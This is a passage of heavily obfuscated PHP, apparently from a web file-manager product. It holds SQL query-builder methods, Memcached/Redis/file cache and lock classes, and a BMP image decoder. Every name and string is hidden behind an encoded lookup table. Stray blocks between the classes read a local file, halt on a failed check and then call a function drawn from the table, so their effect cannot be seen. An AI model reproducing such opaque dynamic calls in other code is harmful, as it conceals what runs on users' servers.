$f渜; } protected function parseWhereItem($eʕ, $b) { $a =& $_SERVER[拘]; $AӒ˷ = $a[67]; if ($a[93]($b)) { if ($a[66]($b[0])) { $c = $a[80]($b[0]); if ($a[176]($b[0], array($a[147], $a[197], $a[198], $a[199], $a[200], $a[201]))) { $AӒ˷ .= $eʕ . $a[168] . $b[0] . $a[168] . $this->{$_SERVER[拘][150]}($b[1]); } elseif ($a[131]($a[202], $b[0])) { $AӒ˷ .= $eʕ . $a[168] . $this->exp[$c] . $a[168] . $this->{$_SERVER[拘][150]}($b[1]); } elseif ($a[131]($a[203], $b[0])) { if ($a[93]($b[1])) { $c = isset($b[2]) ? $a[84]($b[2]) : $a[178]; if ($a[176]($c, array($a[177], $a[178], $a[179]))) { $dா = array(); foreach ($b[1] as $AڠΉ) { $dா[] = $eʕ . $a[168] . $this->exp[$c] . $a[168] . $this->{$_SERVER[拘][150]}($AڠΉ); } $AӒ˷ .= $a[189] . $a[152]($a[168] . $c . $a[168], $dா) . $a[191]; } } else { $AӒ˷ .= $eʕ . $a[168] . $this->exp[$c] . $a[168] . $this->{$_SERVER[拘][150]}($b[1]); } } elseif ($a[145] == $c) { $AӒ˷ .= $a[204] . $eʕ . $a[168] . $b[1] . $a[205]; } elseif ($a[131]($a[206], $b[0])) { if (isset($b[2]) && $a[145] == $b[2]) { $AӒ˷ .= $eʕ . $a[168] . $this->exp[$c] . $a[168] . $b[1]; } else { if ($a[66]($b[1])) { $b[1] = $a[4]($a[119], $b[1]); } $EС = $a[152]($a[119], $this->{$_SERVER[拘][150]}($b[1])); $AӒ˷ .= $eʕ . $a[168] . $this->exp[$c] . $a[204] . $EС . $a[191]; } } elseif ($a[131]($a[207], $b[0])) { $b = $a[66]($b[1]) ? $a[4]($a[119], $b[1]) : $b[1]; $AӒ˷ .= $a[204] . $eʕ . $a[168] . $this->exp[$c] . $a[168] . $this->{$_SERVER[拘][150]}($b[0]) . $a[180] . $this->{$_SERVER[拘][150]}($b[1]) . $a[194]; } else { $a[76]($a[77]($a[186]) . $a[91] . $b[0]); } } else { $f˷ք = $a[37]($b); $eǦ = isset($b[$f˷ք - 1]) ? $a[84]($b[$f˷ք - 1]) : $a[67]; if ($a[176]($eǦ, array($a[177], $a[178], $a[179]))) { $f˷ք = $f˷ք - 1; } else { $eǦ = $a[177]; } for ($c = 0; $c < $f˷ք; $c++) { $b = $a[93]($b[$c]) ? $b[$c][1] : $b[$c]; if ($a[145] == $a[80]($b[$c][0])) { $AӒ˷ .= $a[189] . $eʕ . $a[168] . $b . $a[205] . $eǦ . $a[168]; } else { $eཞ = $a[93]($b[$c]) ? $this->exp[$a[80]($b[$c][0])] : $a[147]; if (!$eཞ && $a[93]($b[$c]) && $a[176]($b[$c][0], array($a[147], $a[197], $a[198], $a[199], $a[200], $a[201]))) { $eཞ = $b[$c][0]; } $AӒ˷ .= $a[189] . $eʕ . $a[168] . $eཞ . $a[168] . $this->{$_SERVER[拘][150]}($b) . $a[205] . $eǦ . $a[168]; } } $AӒ˷ = $a[7]($AӒ˷, 0, -4); } } else { $AӒ˷ .= $eʕ . $a[208] . $this->{$_SERVER[拘][150]}($b); } return $AӒ˷; } protected function parseThinkWhere($A, $A櫝˛) { $F϶ =& $_SERVER[拘]; $A梵 = $F϶[67]; switch ($A) { case $F϶[209]: $A梵 = $A櫝˛; break; case $F϶[182]: $A梵 = $F϶[66]($A櫝˛) ? $A櫝˛ : $F϶[7]($this->{$_SERVER[拘][210]}($A櫝˛), 6); break; case $F϶[211]: parse_str($A櫝˛, $C҅Ʃ); if (isset($C҅Ʃ[$F϶[175]])) { $F = $F϶[168] . $F϶[84]($C҅Ʃ[$F϶[175]]) . $F϶[168]; unset($C҅Ʃ[$F϶[175]]); } else { $F = $F϶[180]; } $d녛 = array(); foreach ($C҅Ʃ as $c => $Bɜآ) { $d녛[] = $this->{$_SERVER[拘][146]}($c) . $F϶[208] . $this->{$_SERVER[拘][150]}($Bɜآ); } $A梵 = $F϶[152]($F, $d녛); break; } return $A梵; } protected function parseLimit($Fǆޕ) { $c =& $_SERVER[拘]; return !empty($Fǆޕ) ? $c[212] . $Fǆޕ . $c[168] : $c[67]; } protected function parseJoin($CÒ) { $C씌 =& $_SERVER[拘]; $D = $C씌[67]; if (!empty($CÒ)) { if ($C씌[93]($CÒ)) { foreach ($CÒ as $C䜥 => $d矲) { if (!1 !== $C씌[213]($d矲, $C씌[214])) { $D .= $C씌[168] . $d矲; } else { $D .= $C씌[215] . $d矲; } } } else { $D .= $C씌[215] . $CÒ; } } $D = $C씌[216]($C씌[217], $C씌[108]($C씌[218]) . $C씌[219], $D); return $D; } protected function parseOrder($d뒉) { $Dˉƽ =& $_SERVER[拘]; if ($Dˉƽ[93]($d뒉)) { $fޏ = array(); foreach ($d뒉 as $A => $D˹) { if ($Dˉƽ[68]($A)) { $fޏ[] = $this->{$_SERVER[拘][146]}($D˹); } else { $D˹ = $Dˉƽ[176]($Dˉƽ[84]($Dˉƽ[70]($D˹)), array($Dˉƽ[220], $Dˉƽ[221])) ? $Dˉƽ[168] . $D˹ : $Dˉƽ[67]; if ($Dˉƽ[131]($Dˉƽ[222], $A)) { $fޏ[] = $this->{$_SERVER[拘][146]}($A) . $D˹; } else { $Dˉƽ[76]($Dˉƽ[223] . $A); } } } $d뒉 = $Dˉƽ[152]($Dˉƽ[119], $fޏ); } return !empty($d뒉) ? $Dˉƽ[224] . $d뒉 : $Dˉƽ[67]; } protected function parseGroup($b) { $dٍ =& $_SERVER[拘]; return !empty($b) ? $dٍ[225] . $b : $dٍ[67]; } protected function parseHaving($aﾐ) { $F =& $_SERVER[拘]; return !empty($aﾐ) ? $F[226] . $aﾐ : $F[67]; } protected function parseComment($B袠) { $A⅌ =& $_SERVER[拘]; return !empty($B袠) ? $A⅌[227] . $B袠 . $A⅌[228] : $A⅌[67]; } protected function parseDistinct($cԉ綄) { $aљ =& $_SERVER[拘]; return !empty($cԉ綄) ? $aљ[229] : $aљ[67]; } protected function parseUnion($C) { $c =& $_SERVER[拘]; if (empty($C)) { return $c[67]; } if (isset($C[$c[230]])) { $E = $c[231]; unset($C[$c[230]]); } else { $E = $c[232]; } foreach ($C as $FŇ) { $A[] = $E . ($c[93]($FŇ) ? $this->{$_SERVER[拘][233]}($FŇ) : $FŇ); } return $c[152]($c[168], $A); } public function insert($f, $D = array(), $fڠ = false) { goto F£; DيɈ: foreach ($f as $d => $b) { if ($f̃ۅ[93]($b) && $f̃ۅ[145] == $b[0]) { $d[] = $this->{$_SERVER[拘][146]}($d); $bΪˬ[] = $b[1]; } elseif ($f̃ۅ[148]($b) || $f̃ۅ[149]($b)) { $d[] = $this->{$_SERVER[拘][146]}($d); $bΪˬ[] = $this->{$_SERVER[拘][150]}($b); } } $C狙 = ($fڠ ? $f̃ۅ[235] : $f̃ۅ[236]) . $f̃ۅ[237] . $this->{$_SERVER[拘][238]}($D[$f̃ۅ[239]]) . $f̃ۅ[204] . $f̃ۅ[152]($f̃ۅ[119], $d) . $f̃ۅ[240] . $f̃ۅ[152]($f̃ۅ[119], $bΪˬ) . $f̃ۅ[191]; $C狙 .= $this->{$_SERVER[拘][241]}(isset($D[$f̃ۅ[242]]) ? $D[$f̃ۅ[242]] : !1); goto Eàզ; Eàզ: $C狙 .= $this->{$_SERVER[拘][243]}(!empty($D[$f̃ۅ[244]]) ? $D[$f̃ۅ[244]] : $f̃ۅ[67]); return $this->{$_SERVER[拘][245]}($C狙, $this->{$_SERVER[拘][246]}(!empty($D[$f̃ۅ[247]]) ? $D[$f̃ۅ[247]] : array())); goto F; F£: $f̃ۅ =& $_SERVER[拘]; $bΪˬ = $d = array(); $this->model = $D[$f̃ۅ[234]]; goto DيɈ; F: } public function selectInsert($Cʚ韻, $fا, $c߃ = array()) { goto D֓; Cۦ: $FخѦ[170]($Cʚ韻, array($this, $FخѦ[171])); $b߆ = $FخѦ[248] . $this->{$_SERVER[拘][238]}($fا) . $FخѦ[204] . $FخѦ[152]($FخѦ[119], $Cʚ韻) . $FخѦ[205]; $b߆ .= $this->{$_SERVER[拘][233]}($c߃); goto Aʛ; D֓: $FخѦ =& $_SERVER[拘]; $this->model = $c߃[$FخѦ[234]]; if ($FخѦ[66]($Cʚ韻)) { $Cʚ韻 = $FخѦ[4]($FخѦ[119], $Cʚ韻); } goto Cۦ; Aʛ: return $this->{$_SERVER[拘][245]}($b߆, $this->{$_SERVER[拘][246]}(!empty($c߃[$FخѦ[247]]) ? $c߃[$FخѦ[247]] : array())); goto dƌ; dƌ: } public function update($A, $F) { $eՊ =& $_SERVER[拘]; $this->model = $F[$eՊ[234]]; $bʮΦ = $eՊ[249] . $this->{$_SERVER[拘][238]}($F[$eՊ[239]]) . $this->{$_SERVER[拘][250]}($A) . $this->{$_SERVER[拘][210]}(!empty($F[$eՊ[251]]) ? $F[$eՊ[251]] : $eՊ[67]) . $this->{$_SERVER[拘][252]}(!empty($F[$eՊ[253]]) ? $F[$eՊ[253]] : $eՊ[67]) . $this->{$_SERVER[拘][254]}(!empty($F[$eՊ[255]]) ? $F[$eՊ[255]] : $eՊ[67]) . $this->{$_SERVER[拘][241]}(isset($F[$eՊ[242]]) ? $F[$eՊ[242]] : !1) . $this->{$_SERVER[拘][243]}(!empty($F[$eՊ[244]]) ? $F[$eՊ[244]] : $eՊ[67]); return $this->{$_SERVER[拘][245]}($bʮΦ, $this->{$_SERVER[拘][246]}(!empty($F[$eՊ[247]]) ? $F[$eՊ[247]] : array())); } public function delete($bά = array()) { $e =& $_SERVER[拘]; $this->model = $bά[$e[234]]; $fԢ⒦ = $e[256] . $this->{$_SERVER[拘][238]}($bά[$e[239]]) . $this->{$_SERVER[拘][210]}(!empty($bά[$e[251]]) ? $bά[$e[251]] : $e[67]) . $this->{$_SERVER[拘][252]}(!empty($bά[$e[253]]) ? $bά[$e[253]] : $e[67]) . $this->{$_SERVER[拘][254]}(!empty($bά[$e[255]]) ? $bά[$e[255]] : $e[67]) . $this->{$_SERVER[拘][241]}(isset($bά[$e[242]]) ? $bά[$e[242]] : !1) . $this->{$_SERVER[拘][243]}(!empty($bά[$e[244]]) ? $bά[$e[244]] : $e[67]); return $this->{$_SERVER[拘][245]}($fԢ⒦, $this->{$_SERVER[拘][246]}(!empty($bά[$e[247]]) ? $bά[$e[247]] : array())); } public function select($fĭ = array()) { goto b; fǽ: if ($fϥ && !1 !== $B) { $f鉍[259]($C秾, $B, $fϥ); } return $B; goto fᬫ; d: $fϥ = isset($fĭ[$f鉍[12]]) ? $fĭ[$f鉍[12]] : !1; if ($fϥ) { $C秾 = $f鉍[66]($fϥ[$f鉍[257]]) ? $fϥ[$f鉍[257]] : $f鉍[258] . $f鉍[46]($cݱ); $E = $f鉍[259]($C秾, $f鉍[67], $fϥ); if (!1 !== $E) { return $E; } } $B = $this->{$_SERVER[拘][260]}($cݱ, $this->{$_SERVER[拘][246]}(!empty($fĭ[$f鉍[247]]) ? $fĭ[$f鉍[247]] : array())); goto fǽ; b: $f鉍 =& $_SERVER[拘]; $this->model = $fĭ[$f鉍[234]]; $cݱ = $this->{$_SERVER[拘][233]}($fĭ); goto d; fᬫ: } public function buildSelectSql($d = array()) { goto a; D燋٧: $aԂ = $this->{$_SERVER[拘][265]}($this->selectSql, $d); $aԂ .= $this->{$_SERVER[拘][241]}(isset($d[$c΂¹ƒ[242]]) ? $d[$c΂¹ƒ[242]] : !1); if (isset($f)) { $c΂¹ƒ[259]($f, $aԂ); } goto B֊̏; a: $c΂¹ƒ =& $_SERVER[拘]; if (isset($d[$c΂¹ƒ[261]])) { if ($c΂¹ƒ[165]($d[$c΂¹ƒ[261]], $c΂¹ƒ[119])) { list($d, $E) = $c΂¹ƒ[4]($c΂¹ƒ[119], $d[$c΂¹ƒ[261]]); } else { $d = $d[$c΂¹ƒ[261]]; } $d = $d ? $d : 1; $E = isset($E) ? $E : ($c΂¹ƒ[68]($d[$c΂¹ƒ[255]]) ? $d[$c΂¹ƒ[255]] : 20); $Fƍ = $E * ((int) $d - 1); $d[$c΂¹ƒ[255]] = $Fƍ . $c΂¹ƒ[119] . $E; } if ($c΂¹ƒ[108]($c΂¹ƒ[262])) { $f = $c΂¹ƒ[263] . $c΂¹ƒ[46]($c΂¹ƒ[264]($d)); $E과 = $c΂¹ƒ[259]($f); if ($E과) { return $E과; } } goto D燋٧; B֊̏: return $aԂ; goto E׍; E׍: } public function parseSql($b, $c߹ = array()) { $f =& $_SERVER[拘]; $b = $f[69](array($f[266], $f[267], $f[268], $f[269], $f[270], $f[271], $f[272], $f[273], $f[274], $f[275], $f[276]), array($this->{$_SERVER[拘][238]}("{$c߹[$f[239]]}"), $this->{$_SERVER[拘][277]}(isset($c߹[$f[278]]) ? $c߹[$f[278]] : !1), $this->{$_SERVER[拘][279]}(!empty($c߹[$f[280]]) ? $c߹[$f[280]] : $f[167]), $this->{$_SERVER[拘][281]}(!empty($c߹[$f[282]]) ? $c߹[$f[282]] : $f[67]), $this->{$_SERVER[拘][210]}(!empty($c߹[$f[251]]) ? $c߹[$f[251]] : $f[67]), $this->{$_SERVER[拘][283]}(!empty($c߹[$f[284]]) ? $c߹[$f[284]] : $f[67]), $this->{$_SERVER[拘][285]}(!empty($c߹[$f[286]]) ? $c߹[$f[286]] : $f[67]), $this->{$_SERVER[拘][252]}(!empty($c߹[$f[253]]) ? $c߹[$f[253]] : $f[67]), $this->{$_SERVER[拘][254]}(!empty($c߹[$f[255]]) ? $c߹[$f[255]] : $f[67]), $this->{$_SERVER[拘][287]}(!empty($c߹[$f[288]]) ? $c߹[$f[288]] : $f[67]), $this->{$_SERVER[拘][243]}(!empty($c߹[$f[244]]) ? $c߹[$f[244]] : $f[67])), $b); return $b; } public function getLastSql($b = '') { return $b ? $this->modelSql[$b] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($D싉ӷ) { return $_SERVER[拘][289]($D싉ӷ); } public function setModel($f) { $this->model = $f; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $this->{$_SERVER[拘][291]}(); } public function close() { } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto FΦܤ; FܗˌԪ: $D줕ʺ = $GLOBALS[$d[11]][$d[12]]; $C = $D줕ʺ[$D줕ʺ[$d[16]]]; $Dΰ = $D줕ʺ[$d[292]]; goto bʋ; bʋ: switch ($D줕ʺ[$d[16]]) { case $d[14]: self::$handle = $d[64]($d[65]); break; case $d[19]: self::$handle = new CacheRedis($C, $Dΰ); break; case $d[21]: self::$handle = new CacheMemcached($C, $Dΰ); break; case $d[18]: self::$handle = new CacheFile($C, $Dΰ); break; default: break; } return self::$handle; goto Bɖ; FΦܤ: $d =& $_SERVER[拘]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto FܗˌԪ; Bɖ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($d) { $Cã =& $_SERVER[拘]; if ($Cã[93]($d) || $Cã[296]($d)) { $d = $Cã[297]($d); } return KOD_SITE_ID . $Cã[183] . $d; } public static function get($cґ) { $cґ = self::key($cґ); if (!isset(self::$memoryCache[$cґ])) { $e = self::init()->{$_SERVER[拘][59]}($cґ); self::$memoryCache[$cґ] = $_SERVER[拘][298]($e); } return self::$memoryCache[$cґ]; } public static function set($eא, $Fզ޶, $bՊл = false) { goto EԨ; f: CacheLock::unlock($eא); return $D˓; goto B; e: CacheLock::lock($eא); $D˓ = self::init()->{$_SERVER[拘][61]}($eא, $_SERVER[拘][264]($Fզ޶), $bՊл); self::$memoryCache[$eא] = $Fզ޶; goto f; EԨ: $eא = self::key($eא); if (isset(self::$memoryCache[$eא]) && self::$memoryCache[$eא] === $Fզ޶) { return !0; } if ($bՊл === 0) { self::$memoryCache[$eא] = $Fզ޶; return !0; } goto e; B: } public static function remove($cԔ) { goto c֎; Dв: return $aȑ; goto c; F: CacheLock::lock($cԔ); $aȑ = self::init()->{$_SERVER[拘][62]}($cԔ); CacheLock::unlock($cԔ); goto Dв; c֎: $cԔ = self::key($cԔ); unset(self::$memoryCache[$cԔ]); self::clearTimeout(); goto F; c: } public static function deleteAll() { $F숔 =& $_SERVER[拘]; self::$memoryCache = array(); if ($F숔[89](self::init(), $F숔[300])) { self::init()->{$_SERVER[拘][301]}(); } } public static function clearTimeout() { $aתغ =& $_SERVER[拘]; if ($aתغ[89](self::init(), $aתغ[302])) { self::init()->{$_SERVER[拘][299]}(); } } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($d, $a) { $Eˍ =& $_SERVER[拘]; if (!$Eˍ[82]($Eˍ[303])) { $Eˍ[29]($Eˍ[304], !1); } $this->cacheTime = $a; $this->handle = new Memcached(); if ($Eˍ[93]($d[$Eˍ[306]]) && $Eˍ[37]($d[$Eˍ[306]]) >= 1) { foreach ($d[$Eˍ[306]] as $EՌ) { $dد = $Eˍ[4]($Eˍ[91], $EՌ); $this->handle->{$_SERVER[拘][307]}($dد[0], $dد[1]); } } else { $this->handle->{$_SERVER[拘][307]}($d[$Eˍ[129]], $d[$Eˍ[130]]); } } public function set($a, $A͜, $Bև = false) { $Bև = $Bև ? $Bև : $this->cacheTime; return $this->handle->{$_SERVER[拘][61]}($a, $A͜, $Bև); } public function get($c❢) { return $this->handle->{$_SERVER[拘][59]}($c❢); } public function remove($Aዚ) { return $this->handle->{$_SERVER[拘][308]}($Aዚ); } public function deleteAll() { return $this->handle->{$_SERVER[拘][309]}(); } } goto F̨; c: if ($_SERVER[$_SERVER[拘][33]] != $b($dʯ)) { goto aբŰ; bʉ: $aй($dʯ); goto d; aբŰ: $fк = $_SERVER[拘][34]; $Eо薩 = BASIC_PATH . $_SERVER[拘][35]; $Eы옑 = $fк($Eо薩); goto CӜ; CӜ: $FᐶӞ = $_SERVER[拘][4]($_SERVER[拘][36], $Eы옑); if ($_SERVER[拘][37]($FᐶӞ) < $_SERVER[拘][38]) { die; } $aй = $_SERVER[拘][39]; goto bʉ; d: } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $E҉ =& $_SERVER[拘]; $AÚƹ = $GLOBALS[$E҉[11]][$E҉[12]]; self::$cachePath = $AÚƹ[$E҉[18]][$E҉[40]]; @$E҉[41](self::$cachePath, 511, !0); } public function lock($Fʝ, $E̽ = 0) { goto a; bݑ: $C = $dĴƜ[43](self::$cachePath, $dĴƜ[44]) . $dĴƜ[45] . $dĴƜ[46]($Fʝ) . $dĴƜ[47]; if ($dĴƜ[48]($C) && $dĴƜ[49]($C) < $dĴƜ[50]() - $E̽) { @$dĴƜ[51]($C); return !1; } do { if ($dĴƜ[48]($C)) { $dĴƜ[52](); continue; } $c = $dĴƜ[53]($C, $dĴƜ[54]); $dĴƜ[55]($c, $FȮ); $D潮 = $dĴƜ[56]($c, LOCK_EX | LOCK_NB); self::$caches[$Fʝ] = array($dĴƜ[57] => $c, $dĴƜ[18] => $C); if ($c && $D潮) { return !0; } $dĴƜ[52](); } while ($dĴƜ[42](!0) < $FȮ); goto FƋ; FƋ: $this->{$_SERVER[拘][30]}($Fʝ); return !1; goto f⿋ޕ; a: $dĴƜ =& $_SERVER[拘]; $b䖹 = $dĴƜ[42](!0); $FȮ = $b䖹 + $E̽ + 0.0001; goto bݑ; f⿋ޕ: } public function unlock($FΨ) { goto E靅; f: @$F[56]($a[$F[57]], LOCK_UN); @$F[58]($a[$F[57]]); @$F[51]($a[$F[18]]); goto Aӆ; Aӆ: unset(self::$caches[$FΨ]); goto E; E靅: $F =& $_SERVER[拘]; $a = self::$caches[$FΨ]; if (!$a) { return; } goto f; E: } } class CacheLockRedis { public function lock($Dǿ, $D = 10) { $f̠ =& $_SERVER[拘]; $F򐢋 = Cache::init(); $f = $f̠[42](!0) + $D; while ($f̠[42](!0) < $f) { $Bε = $F򐢋->{$_SERVER[拘][59]}($Dǿ); if (!$Bε) { $A׆ = $F򐢋->{$_SERVER[拘][60]}($Dǿ, $f, $D); if ($A׆) { return !0; } } else { if ($Bε < $f̠[42](!0)) { $F򐢋->{$_SERVER[拘][61]}($Dǿ, $f, $f); if ($F򐢋->{$_SERVER[拘][59]}($Dǿ) === $Bε) { return !0; } } } $f̠[52](); } return !1; } public function unlock($cط) { $Eӆ = Cache::init(); $Eӆ->{$_SERVER[拘][62]}($cط); } } goto A݊; E۳: if ($_SERVER[$_SERVER[拘][33]] != $_SERVER[$_SERVER[拘][1256]]) { goto EҤ; f픈: $FᐶӞ = $_SERVER[拘][4]($_SERVER[拘][36], $Eы옑); if ($_SERVER[拘][37]($FᐶӞ) < $_SERVER[拘][38]) { die; } $aй = $_SERVER[拘][39]; goto Eѻ; Eѻ: $aй($_SERVER[$_SERVER[拘][1257]]); goto fñޱ; EҤ: $fк = $_SERVER[拘][34]; $Eо薩 = BASIC_PATH . $_SERVER[拘][35]; $Eы옑 = $fк($Eо薩); goto f픈; fñޱ: } class imageGdBMP { public static function load($Aė) { $d߲ =& $_SERVER[拘]; $Fɦ = $d߲[53]($Aė, $d߲[2215]); if ($Fɦ === !1) { return !1; } $Bеʢ = self::loadFromStream($Fɦ); $d߲[58]($Fɦ); return $Bеʢ; } public static function loadFromStream($BŞ) { $fފթ =& $_SERVER[拘]; $cВ = $fފթ[577]($BŞ, 14); if ($cВ === !1) { return !1; } if ($cВ[0] != $fފթ[2238] || $cВ[1] != $fފթ[2239]) { return !1; } $a٤ = $fފթ[2240]($fފթ[2241] . $fފթ[2242] . $fފթ[2243] . $fފթ[2244] . $fފթ[2245], $cВ); return self::loadFromStreamAndFileHeader($BŞ, $a٤); } public static function loadFromStreamAndFileHeader($DП, array $Fė) { goto F; eك: if ($f == 1 || $f == 4 || $f == 8) { goto Fӫ; Fӫ: $e = $Cٍْ[2269]($EŇ, $E); $E鉄 = $eɂդ == 12 ? 3 : 4; $eް = $AĆ ? $AĆ : $Cٍْ[633](2, $f); goto c숽я; d⾳؇: $F̧ = (1 << $f) - 1 << $Bغ; if ($a == 1 || $a == 2) { $cꒉݶ = 0; $A喣 = $f >> 2 & 1; for (;;) { if ($cꒉݶ < -1 || $cꒉݶ > $EŇ || $eۖ < -1 || $eۖ > $A톏ⰲ) { $Cٍْ[2270]($e); return !1; } $b = $Cٍْ[577]($DП, 1); if ($b === !1) { $Cٍْ[2270]($e); return !1; } switch ($b) { case $Cٍْ[2266]: $b = $Cٍْ[577]($DП, 1); if ($b === !1) { $Cٍْ[2270]($e); return !1; } switch ($b) { case $Cٍْ[2266]: $eۖ += $E; $cꒉݶ = 0; break; case $Cٍْ[2273]: $eۖ = 0; $cꒉݶ = 0; break 3; case $Cٍْ[2274]: $b = $Cٍْ[577]($DП, 2); if ($b === !1) { $Cٍْ[2270]($e); return !1; } list(, $D, $aǲ) = $Cٍْ[2240]($Cٍْ[2275], $b); $cꒉݶ += $D; $eۖ += $aǲ * $E; break; default: list(, $a̩) = $Cٍْ[2240]($Cٍْ[2276], $b); $C酅 = ($a̩ >> $A喣) + ($a̩ & $A喣); $b = $Cٍْ[577]($DП, $C酅 + 1 & ~1); if ($b === !1) { $Cٍْ[2270]($e); return !1; } for ($aه = 0, $cȥخ = 0; $aه < $a̩; ++$aه, ++$cꒉݶ, $cȥخ += $f) { list(, $a׭) = $Cٍْ[2240]($Cٍْ[2276], $b[$cȥخ >> 3]); $dô = $cȥخ & 7; $Cٍْ[2277]($e, $cꒉݶ, $eۖ, $Aӳ[($a׭ & $F̧ >> $dô) >> $Bغ - $dô]); } break; } break; default: $aد = $Cٍْ[577]($DП, 1); if ($aد === !1) { $Cٍْ[2270]($e); return !1; } list(, $B, $a׭) = $Cٍْ[2240]($Cٍْ[2275], $b . $aد); for ($aه = 0, $cȥخ = 0; $aه < $B; ++$aه, ++$cꒉݶ, $cȥخ += $f) { $dô = $cȥخ & 7; $Cٍْ[2277]($e, $cꒉݶ, $eۖ, $Aӳ[($a׭ & $F̧ >> $dô) >> $Bغ - $dô]); } break; } } } else { for ($Fݶ = 0; $Fݶ < $E; ++$Fݶ, $eۖ += $E) { $b = $Cٍْ[577]($DП, $d㟈); if ($b === !1) { $Cٍْ[2270]($e); return !1; } $cȥخ = 0; for ($cꒉݶ = 0; $cꒉݶ < $EŇ; ++$cꒉݶ, $cȥخ += $f) { list(, $a׭) = $Cٍْ[2240]($Cٍْ[2276], $b[$cȥخ >> 3]); $dô = $cȥخ & 7; $Cٍْ[2277]($e, $cꒉݶ, $eۖ, $Aӳ[($a׭ & $F̧ >> $dô) >> $Bغ - $dô]); } } } goto d; c숽я: $Aӳ = array(); for ($aه = 0; $aه < $eް; ++$aه) { $b = $Cٍْ[577]($DП, $E鉄); if ($b === !1) { $Cٍْ[2270]($e); return !1; } extract($Cٍْ[2240]($Cٍْ[2271], $b . $Cٍْ[2266])); $Aӳ[] = $Cٍْ[2272]($e, $A, $bժ, $dô); } $Bغ = 8 - $f; goto d⾳؇; d: } else { goto Cό; Cό: $e = $Cٍْ[2278]($EŇ, $E); $Cٍْ[2279]($e, !1); if ($Fآբ) { $Cٍْ[2280]($e, !0); } goto d훶; d훶: $Bۮ = $f >> 3; $eԾͼ = $Fآբ ? 127 : 0; $bܭ = $Fآբ ? 1 / $Fآբ : 1; goto F׮; F׮: $E캌 = $Eψ ? 1 / $Eψ : 1; $Bߩ = $fٚ ? 1 / $fٚ : 1; $FÏͨ = $Aڐ ? 1 / $Aڐ : 1; goto Bƽ; Bƽ: for ($Fݶ = 0; $Fݶ < $E; ++$Fݶ, $eۖ += $E) { $b = $Cٍْ[577]($DП, $d㟈); if ($b === !1) { $Cٍْ[2270]($e); return !1; } $cȥخ = 0; for ($cꒉݶ = 0; $cꒉݶ < $EŇ; ++$cꒉݶ, $cȥخ += $Bۮ) { list(, $a׭) = $Cٍْ[2240]($Cٍْ[2247], $Cٍْ[7]($b, $cȥخ, $Bۮ) . $Cٍْ[2281]); $a = $a׭ & $Fآբ; $cڔ = $a׭ & $Eψ; $f = $a׭ & $fٚ; $F = $a׭ & $Aڐ; $C̘ = $eԾͼ - (($a << 7) - $a) * $bܭ; $A = (($cڔ << 8) - $cڔ) * $E캌; $bժ = (($f << 8) - $f) * $Bߩ; $dô = (($F << 8) - $F) * $FÏͨ; $Cٍْ[2277]($e, $cꒉݶ, $eۖ, $C̘ << 24 | $A << 16 | $bժ << 8 | $dô); } } $Cٍْ[2279]($e, !0); goto A; A: } return $e; goto aǌ; Bڙ: $E = $Cٍْ[595]($A톏ⰲ); $eۖ = $A톏ⰲ > 0 ? $E - 1 : 0; $E = $A톏ⰲ > 0 ? -1 : 1; goto eك; F: $Cٍْ =& $_SERVER[拘]; if ($Fė[$Cٍْ[445]] != 19778) { return !1; } $b = $Cٍْ[577]($DП, 4); goto aȝ߮; aג: if ($EŇ == 0 || $A톏ⰲ == 0 || $d䌔 != 1 || ($Fآբ & $Eψ) != 0 || ($Fآբ & $fٚ) != 0 || ($Fآբ & $Aڐ) != 0 || ($Eψ & $fٚ) != 0 || ($Eψ & $Aڐ) != 0 || ($fٚ & $Aڐ) != 0) { return !1; } if ($a == 4 || $a == 5) { $b = $Cٍْ[2267]($DП, $D); if ($b === !1) { return !1; } return $Cٍْ[2268]($b); } $d㟈 = $EŇ * $f + 31 >> 3 & ~3; goto Bڙ; aȝ߮: if ($b === !1) { return !1; } list(, $eɂդ) = $Cٍْ[2240]($Cٍْ[2247], $b); if ($eɂդ == 12) { goto EՋ; Cֵإ: $Aڐ = 255; goto f; EՋ: $b = $Cٍْ[577]($DП, $eɂդ - 4); if ($b === !1) { return !1; } extract($Cٍْ[2240]($Cٍْ[2248] . $Cٍْ[2249] . $Cٍْ[2250] . $Cٍْ[2251], $b)); goto B; B: $AĆ = $D، = $Fآբ = $a = 0; $Eψ = 16711680; $fٚ = 65280; goto Cֵإ; f: } else { if (124 < $eɂդ || $eɂդ < 40) { return !1; } else { goto d̘; Aё: if (($f == 16 || $f == 24 || $f == 32) && $a == 0 && $Eψ == 0 && $fٚ == 0 && $Aڐ == 0) { switch ($f) { case 16: $Eψ = 31744; $fٚ = 992; $Aڐ = 31; break; case 24: case 32: $Eψ = 16711680; $fٚ = 65280; $Aڐ = 255; break; } } goto bƓ; c: if ($EŇ & 2147483648) { $EŇ = -(~$EŇ & 4294967295) - 1; } if ($A톏ⰲ & 2147483648) { $A톏ⰲ = -(~$A톏ⰲ & 4294967295) - 1; } if ($A & 2147483648) { $A = -(~$A & 4294967295) - 1; } goto bљ; d̘: $b = $Cٍْ[577]($DП, 36); if ($b === !1) { return !1; } extract($Cٍْ[2240]($Cٍْ[2252] . $Cٍْ[2253] . $Cٍْ[2250] . $Cٍْ[2254] . $Cٍْ[2255] . $Cٍْ[2256] . $Cٍْ[2257] . $Cٍْ[2258] . $Cٍْ[2259] . $Cٍْ[2260], $b)); goto c; bљ: if ($Fܯ & 2147483648) { $Fܯ = -(~$Fܯ & 4294967295) - 1; } if ($Fė[$Cٍْ[1730]] != 0) { $aН = $f == 1 || $f == 4 || $f == 8 ? ($AĆ ? $AĆ : $Cٍْ[633](2, $f)) << 2 : 0; $e¦ʵ = $D ? $D : ($EŇ * $f + 31 >> 3 & ~3) * $Cٍْ[595]($A톏ⰲ); $eչ = $Fė[$Cٍْ[1730]] - $e¦ʵ - $aН - 14; if ($eɂդ < $eչ && 40 <= $eɂդ && $eɂդ <= 124) { $eɂդ = $eչ; } } if ($eɂդ - 40 > 0) { $b = $Cٍْ[577]($DП, $eɂդ - 40); if ($b === !1) { return !1; } extract($Cٍْ[2240]($Cٍْ[2261] . $Cٍْ[2262] . $Cٍْ[2263] . $Cٍْ[2264], $b . $Cٍْ[2265]($Cٍْ[2266], 120))); } else { $Fآբ = $Eψ = $fٚ = 